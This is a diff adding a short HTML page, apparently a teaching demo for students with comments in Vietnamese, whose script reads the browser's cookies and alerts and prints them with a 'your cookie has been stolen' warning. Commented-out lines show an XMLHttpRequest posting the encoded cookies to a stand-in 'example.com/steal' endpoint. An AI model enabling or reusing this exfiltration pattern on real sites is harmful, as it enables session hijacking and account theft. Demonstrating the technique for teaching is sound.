@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        var cookies = document.cookie;
+        var xhr = new XMLHttpRequest();
+        // xhr.open("POST", "http://example.com/steal", true);
+        // xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        // xhr.send("stolen_cookies=" + encodeURIComponent(cookies));
+        
+        // Hiển thị thông báo cho học sinh
+        alert("Cảnh báo: Cookie của bạn đã bị đánh cắp! Nội dung: " + cookies);
+        
+        // Ghi thông tin lên trang
+        document.write("Cookies đã bị gửi đi: " + cookies);
+    </script>
+</body>
+</html>
